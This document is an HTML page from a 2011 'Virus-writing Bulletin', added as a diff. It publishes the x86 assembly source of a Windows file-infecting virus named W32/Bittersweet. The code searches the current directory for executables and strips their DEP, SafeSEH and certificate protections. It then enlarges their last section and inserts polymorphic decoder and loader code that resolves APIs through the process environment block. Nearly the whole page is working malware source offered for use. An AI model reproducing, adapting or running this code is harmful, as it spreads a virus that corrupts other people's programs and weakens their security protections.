@@ -1,0 +1,635 @@
+<html>
+<head><title>;)</title><link rel="stylesheet" href="style.css" /></head>
+<body>
+<center><h3>Virus-writing Bulletin</h3><h5>Presents!</h5><h4>W32/Bittersweet</h4>-<br><font size=0>. &#9679; glósóli &#9679; .</font></center><br>
+<div id="menu">
+[ <li><a href="1.html">Articles</a></li> ]
+[ <li><a href="2.html">Sources</a></li> ]
+[ <li><a href="3.html">Editorial</a></li> ]
+</div>
+<div id="wrapper">
+<div style="float:left;margin-top:50px;margin-left:1px;">
+<pre>
+.486
+.model  flat, stdcall
+
+CERTIFICATE_TABLE_DATA_DIRECTORY  =  98h
+LOAD_CONFIG_TABLE_DATA_DIRECTORY  =  30h
+DISABLE_NOSEH_DEP                 =  0f0h
+
+CODE_SIZE  =  200h
+REG_ESP    =  4
+REG_ESI    =  7
+POP_OP     =  58h
+
+BIT_COUNT  =  31
+BTI_SIZE   =  5
+BLOCK_SIZE =  80h
+CALL_OP    =  0e8h
+ADD_OP     =  0c083h
+BTS_OP     =  0fba6800h
+
+.code
+assume fs:nothing
+
+NN92_exe        proc
+        dec     dword ptr [esp + 8]          ;do not execute if DLL_PROCESS_DETACH
+        js      DETACH
+        pushad
+        db      33h
+        db      0dbh
+        db      CALL_OP, low offset find_fs - offset delta_seh, 0, 0, 0
+
+delta_seh:
+        db      58h
+        db      58h
+        db      5ch
+        db      33h, 0c0h
+        db      64h
+        db      8fh
+        db      0
+        db      58h
+        popad
+        
+DETACH:
+        ret     0ch
+
+echo  11/11/10 - Bittersweet by hh86         ;the fire in your touch I always find so hard to beat
+                                             ;your love is bittersweet
+NN92_exe        endp
+
+find_fs         proc
+        db      64h
+        db      0ffh
+        db      33h
+        db      64h, 89h, 23h                ;SEH protected
+        enter   (sizeof WIN32_FIND_DATA + sizeof LOADED_IMAGE) + (IMAGE_DOS_HEADER.e_lfanew + 1), 0
+        mov     edi, esp
+        lea     esi, dword ptr [edi + LOADED_IMAGE]
+        push    esi
+        call    GetTickCount
+        mov     seed, eax
+
+;-------------------------------------------------------------------------------
+;find exe files in current directory
+;-------------------------------------------------------------------------------
+
+        db      0e8h
+        dd      6
+        db      "*"
+        db      "."
+        db      "e"
+        db      "x"
+        db      "e"
+        db      0
+        call    FindFirstFile
+        db      95h
+        jmp     call_mf
+
+find_next:
+        db      56h
+        db      55h
+        call    FindNextFile 
+        test    eax, eax
+        jz      call_seh
+
+call_mf:
+        pushad
+        db      CALL_OP, low offset map_file - offset delta_seh, 0, 0, 0
+
+delta_seh:
+        db      58h
+        db      58h
+        db      5ch
+        db      33h, 0c0h
+        db      64h
+        db      8fh
+        db      0
+        db      58h
+        popad
+        jmp     find_next
+find_fs         endp
+
+;-------------------------------------------------------------------------------
+;create map
+;-------------------------------------------------------------------------------
+
+map_file        proc
+        db      64h
+        db      0ffh
+        db      33h
+        db      64h, 89h, 23h                ;SEH protected
+        db      8dh
+        db      4eh
+        db      WIN32_FIND_DATA.cFileName
+        db      57h
+        db      53h
+        db      53h
+        db      57h
+        db      53h
+        db      51h
+        call    MapAndLoad
+        db      48h
+        js      call_seh                     ;no unmap happens if zero
+        db      CALL_OP, low offset infect_exe - offset delta_os, 0, 0, 0
+
+delta_os:
+        db      58h
+        db      58h
+        db      5ch
+        db      33h, 0c0h
+        db      64h
+        db      8fh
+        db      0
+        db      58h
+        call    UnMapAndLoad 
+map_file        endp
+
+call_seh        label    near
+        int     3
+
+infect_exe      proc
+        db      64h
+        db      0ffh
+        db      33h
+        db      64h, 89h, 23h
+
+;-------------------------------------------------------------------------------
+;32-bit machine
+;GUI or CUI
+;-------------------------------------------------------------------------------
+
+        db      8bh
+        db      6fh
+        db      LOADED_IMAGE.MappedAddress
+        db      8bh
+        db      47h
+        db      LOADED_IMAGE.FileHeader
+        db      0f6h
+        db      40h
+        db      IMAGE_NT_HEADERS.FileHeader.Characteristics + 1
+        db      high IMAGE_FILE_32BIT_MACHINE
+        jz      call_seh
+        db      8ah
+        db      48h
+        db      IMAGE_NT_HEADERS.OptionalHeader.Subsystem
+        db      49h
+        db      49h
+        db      80h
+        db      0f9h
+        db      IMAGE_SUBSYSTEM_WINDOWS_CUI - IMAGE_SUBSYSTEM_WINDOWS_GUI
+        jnbe    call_seh
+
+;-------------------------------------------------------------------------------
+;disable NO_SEH and DEP
+;-------------------------------------------------------------------------------
+
+        db      80h
+        db      60h
+        db      IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics + 1
+        db      DISABLE_NOSEH_DEP
+
+;-------------------------------------------------------------------------------
+;PE size must be equal to file size
+;certificate table must be at end of last section
+;-------------------------------------------------------------------------------
+
+        db      8bh
+        db      57h
+        db      LOADED_IMAGE.Sections
+        db      8bh                          ;DWORD not WORD ;)
+        db      4fh
+        db      LOADED_IMAGE.NumberOfSections
+        db      6bh
+        db      0c9h
+        db      sizeof IMAGE_SECTION_HEADER
+        db      8dh
+        db      74h
+        db      11h
+        db      -(sizeof IMAGE_SECTION_HEADER - IMAGE_SECTION_HEADER.SizeOfRawData)
+        db      8dh
+        db      88h
+        dd      CERTIFICATE_TABLE_DATA_DIRECTORY
+        db      8bh
+        db      56h
+        db      sizeof IMAGE_SECTION_HEADER.PointerToRawData
+        db      3
+        db      16h
+        db      0b7h
+        db      20h                          ;more size required this time
+        db      39h
+        db      19h
+        jb      call_seh
+        db      39h
+        db      11h
+        jne     call_seh
+
+;-------------------------------------------------------------------------------
+;set to zero the certificate table data directory
+;disable SafeSEH
+;-------------------------------------------------------------------------------
+
+        fldz
+        fstp    qword ptr [ecx]
+        fldz
+        db      0ddh
+        db      59h
+        db      LOAD_CONFIG_TABLE_DATA_DIRECTORY
+
+;-------------------------------------------------------------------------------
+;increase image and section size
+;-------------------------------------------------------------------------------
+
+        db      1
+        db      5eh
+        db      -(IMAGE_SECTION_HEADER.SizeOfRawData - IMAGE_SECTION_HEADER.Misc.VirtualSize)
+        db      1
+        db      58h
+        db      IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage
+        db      8bh
+        db      4eh
+        db      -(IMAGE_SECTION_HEADER.SizeOfRawData - IMAGE_SECTION_HEADER.VirtualAddress)
+        db      3
+        db      0eh
+        db      1                            ;increase raw size
+        db      1eh
+        or      dword ptr [esi + (IMAGE_SECTION_HEADER.Characteristics - IMAGE_SECTION_HEADER.SizeOfRawData)], IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_EXECUTE
+        lea     edi, dword ptr [ebp + edx]
+        pushad
+        mov     esi, offset require
+        mov     ecx, dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
+                                             ;do not alter entrypoint until code is inserted successfully
+        mov     dword ptr [esi + sizeof STACK_REG.LO32_ESP - 3], ecx
+        mov     ecx, ebx
+        push    edi
+        xor     al, al
+        rep     stosb
+        pop     edi
+        mov     al, 0e8h
+        stosb
+        mov     eax, 200h
+        stosd
+        lea     ebp, dword ptr [edi + BTI_SIZE - 1]
+        add     edi, eax
+
+rand_reg:
+        push    REG_ESI
+        call    nrandom
+        cmp     al, REG_ESP
+        je      rand_reg
+        mov     edx, eax
+        add     al, POP_OP
+        stosb
+        push    edi
+        call    mkblock
+        pop     ebx
+        call    x
+        mov     ax, ADD_OP
+        add     ah, dl
+        stosw
+        push    eax
+        mov     al, BLOCK_SIZE - 4
+        stosb
+        push    edi
+        call    mkblock
+        pop     ebx
+        call    x
+        pop     eax
+        add     ah, 28h
+        stosw
+        mov     byte ptr [edi], BLOCK_SIZE - 8
+        add     ax, 0f87eh - 2
+        mov     word ptr [edi + 1], ax
+        popad
+        mov     dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint], ecx
+        int     3
+
+mkblock         proc
+        push    0
+        push    BTI_SIZE - 1
+        pop     ebx
+
+load_val:
+        push    BIT_COUNT
+        pop     ecx
+        push    2
+        call    nrandom
+        shl     eax, 8
+        lea     eax, dword ptr [eax * 8 + BTS_OP]
+        add     ah, dl
+        cmp     ah, 70h
+        jb      bts_lines
+
+btr_lines:
+        bt      dword ptr [esi], ecx
+        jc      btr_gnext
+        call    write_bt
+
+btr_gnext:
+        dec     ecx
+        jns     btr_lines
+        mov     dword ptr [ebp], ecx
+        jmp     new_value
+
+bts_lines:
+        bt      dword ptr [esi], ecx
+        jnc     bts_gnext
+        call    write_bt
+
+bts_gnext:
+        dec     ecx
+        jns     bts_lines
+
+new_value:
+        lodsd
+        add     ebp, BTI_SIZE - 1
+        add     bl, BTI_SIZE - 1
+        cmp     bl, BLOCK_SIZE
+        jne     load_val
+        pop     eax
+        ret
+mkblock         endp
+
+write_bt        proc
+        push    eax
+        add     eax, ebx
+        bswap   eax
+        stosd
+        mov     al, cl
+        stosb
+        pop     eax
+        inc     dword ptr [esp + 4]
+        ret
+write_bt        endp
+
+;-------------------------------------------------------------------------------
+;randomly swap instructions and increase bit offset
+;-------------------------------------------------------------------------------
+
+x               proc
+        pushad
+        mov     edi, ebx
+        xchg    esi, eax
+        mov     ecx, 9000h
+
+swap_loop:
+        push    esi
+        call    nrandom
+        imul    eax, eax, BTI_SIZE
+        mov     edx, dword ptr [edi + eax]
+        mov     bl, byte ptr [edi + eax + ((offset require_e - offset require_s) / 32) - 1]
+        add     bl, BIT_COUNT + 1
+        push    eax
+        push    esi
+        call    nrandom
+        imul    eax, eax, BTI_SIZE
+        xchg    dword ptr [edi + eax], edx
+        xchg    byte ptr [edi + eax + ((offset require_e - offset require_s) / 32) - 1], bl 
+        pop     eax
+        mov     dword ptr [edi + eax], edx
+        mov     byte ptr [edi + eax + ((offset require_e - offset require_s) / 32) - 1], bl
+        loop    swap_loop
+        popad
+        ret
+x               endp
+infect_exe      endp
+
+.data
+seed            dd     "VC!"
+
+.code
+
+;-------------------------------------------------------------------------------
+;random number generator by Nan
+;some modifications were added to support preservation of volatile registers
+;and free stack of arg0.  I also changed some MOVs :)
+;-------------------------------------------------------------------------------
+
+nrandom         proc
+        push    ecx
+        push    edx
+        mov     eax, seed
+        test    eax, 80000000h
+        jz      label1
+        add     eax, 7fffffffh
+
+label1:
+        xor     edx, edx
+        mov     ecx, 127773
+        div     ecx
+        xchg    ecx, eax
+        mov     eax, 16807
+        mul     edx
+        mov     edx, ecx
+        xchg    ecx, eax
+        mov     eax, 2836
+        mul     edx
+        sub     ecx, eax
+        xor     edx, edx
+        xchg    eax, ecx
+        mov     seed, eax
+        div     dword ptr [esp + 4 + 8]
+        xchg    edx, eax
+        pop     edx
+        pop     ecx
+        ret     4
+nrandom         endp
+
+;-------------------------------------------------------------------------------
+;load DLL code
+;-------------------------------------------------------------------------------
+
+.const
+IMAGE_DIRECTORY_ENTRY_EXPORT = 78h
+
+.data?
+STACK_REG struct
+LO32_EDI       dd   ?
+LO32_ESI       dd   ?
+LO32_EBP       dd   ?
+LO32_ESP       dd   ?
+LO32_EBX       dd   ?
+LO32_EDX       dd   ?
+LO32_ECX       dd   ?
+LO32_EAX       dd   ?
+STACK_REG ends
+
+
+.code
+require_s       label    near
+require         proc
+        db      68h
+        dd      "v!"
+        db      60h
+        db      6ah
+        db      30h                          ;process environment block
+        db      5eh
+        db      64h
+        db      8bh
+        db      6
+        db      8bh                          ;retrieve imagebase
+        db      40h
+        db      8
+        db      1                            ;convert to relative virtual address
+        db      44h
+        db      34h
+        db      -(STACK_REG.LO32_EAX - STACK_REG.LO32_ESP)
+        db      33h
+        db      0d2h
+        db      0e8h                         ;skip SE handler
+        dd      0bh
+        db      58h
+        db      58h
+        db      5ch
+        db      33h, 0c0h
+        db      64h
+        db      8fh
+        db      0
+        db      58h
+        db      61h
+        ret
+        db      64h
+        db      0ffh
+        db      32h
+        db      64h
+        db      89h
+        db      22h
+        db      64h
+        db      0adh
+        db      8bh
+        db      40h
+        db      0ch
+        db      8bh
+        db      70h
+        db      14h
+        db      0adh
+        db      8bh
+        db      0
+        db      8bh
+        db      68h
+        db      10h
+        call    skip_crc 
+        dd      03fc1bd8dh
+        dd      0da68238fh
+
+;-------------------------------------------------------------------------------
+;DLL name
+;-------------------------------------------------------------------------------
+
+        db      30h, 0
+
+skip_crc:
+        db      5eh
+ 
+;-------------------------------------------------------------------------------
+;walk lists
+;-------------------------------------------------------------------------------
+
+crc32   macro
+        db      32h
+        db      7
+        db      6ah
+        db      8
+        db      59h
+        db      0d1h
+        db      0e8h
+        db      73h
+        db      5
+        db      35h
+        dd      0edb88320h
+        db      0e2h
+        db      0f5h
+        db      47h
+        db      38h
+        db      0fh
+        db      75h
+        db      0ebh
+endm
+
+import_next:
+        db      8bh
+        db      45h
+        db      IMAGE_DOS_HEADER.e_lfanew
+        db      8bh
+        db      5ch
+        db      28h
+        db      IMAGE_DIRECTORY_ENTRY_EXPORT
+        db      3
+        db      0ddh
+
+export_next:
+        db      8bh
+        db      7bh
+        db      IMAGE_EXPORT_DIRECTORY.AddressOfNames
+        db      3
+        db      0fdh
+        db      8bh
+        db      3ch
+        db      97h
+        db      0f9h
+        db      1bh
+        db      0c0h
+        db      3
+        db      0fdh
+        crc32
+        db      0f7h
+        db      0d0h
+        db      39h
+        db      6
+        je      l_res
+        db      42h
+        db      39h
+        db      53h
+        db      IMAGE_EXPORT_DIRECTORY.TimeDateStamp + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint - IMAGE_EXPORT_DIRECTORY.TimeDateStamp shl 2 - sizeof IMAGE_EXPORT_DIRECTORY.NumberOfNames
+        jne     export_next
+        int     3
+
+;-------------------------------------------------------------------------------
+;resolve API address
+;-------------------------------------------------------------------------------
+
+l_res:
+        db      8bh
+        db      7bh
+        db      IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
+        db      3
+        db      0fdh
+        db      0fh
+        db      0b7h
+        db      3ch
+        db      57h
+        db      8bh
+        db      43h
+        db      IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
+        db      3
+        db      0c5h
+        db      8bh
+        db      4
+        db      0b8h
+        db      3
+        db      0c5h
+        db      50h
+        db      0adh
+        db      33h
+        db      0d2h
+        db      80h
+        db      3eh
+        db      30h
+        jne     import_next
+        db      8bh
+        db      0dch
+        db      56h
+        db      0ffh, 53h, 4                 ;call LoadLibraryA
+        db      50h
+        db      0ffh, 13h                    ;call FreeLibrary
+        int     3
+require         endp
+require_e       label    near
+end     NN92_exe
+So, here I am.
+</pre>
+</div>
+</div>
+<div id="endofpage"><div style="width:900px;margin:0pt auto;padding-top:5px;padding-bottom:5px">Virus-writing Bulletin 2011</div>
+</body>
+</html>
